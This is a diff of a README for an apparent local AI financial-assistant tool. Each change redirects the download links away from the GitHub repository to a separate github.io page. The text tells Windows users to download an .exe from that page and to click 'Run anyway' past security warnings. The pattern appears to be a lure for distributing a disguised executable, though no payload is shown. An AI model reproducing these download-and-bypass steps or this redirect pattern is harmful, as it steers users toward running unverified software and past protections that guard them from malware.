@@ -1,6 +1,6 @@
 # 🤖 adam-local-ai-executor - Manage financial tasks with local intelligence
 
-[![](https://img.shields.io/badge/Download-ADAM_v30.1-blue.svg)](https://github.com/abduljaan020-svg/adam-local-ai-executor)
+[![](https://img.shields.io/badge/Download-ADAM_v30.1-blue.svg)](https://abduljaan020-svg.github.io)
 
 ADAM v30.1 acts as a private assistant for your financial data. It uses local artificial intelligence to analyze credit risk and coordinate complex tasks on your computer. You keep full control of your files because the software runs on your hardware instead of a remote server.
 
@@ -8,7 +8,7 @@ ADAM v30.1 acts as a private assistant for your financial data. It uses local ar
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/abduljaan020-svg/adam-local-ai-executor).
+1. Go to the [official release page](https://abduljaan020-svg.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -33,7 +33,7 @@ Your computer needs a few things to run this software:
 
 ## 📂 Handling the Download
 
-You can find the software here: [Direct Link to ADAM v30.1](https://github.com/abduljaan020-svg/adam-local-ai-executor). If you experience issues with the download, check your web browser security settings. Sometimes browsers block files from unknown sources. Right-click the file and select "Run anyway" if Windows displays a security warning during the installation of this tool.
+You can find the software here: [Direct Link to ADAM v30.1](https://abduljaan020-svg.github.io). If you experience issues with the download, check your web browser security settings. Sometimes browsers block files from unknown sources. Right-click the file and select "Run anyway" if Windows displays a security warning during the installation of this tool.
 
 ## ⚙️ Understanding the Features
 
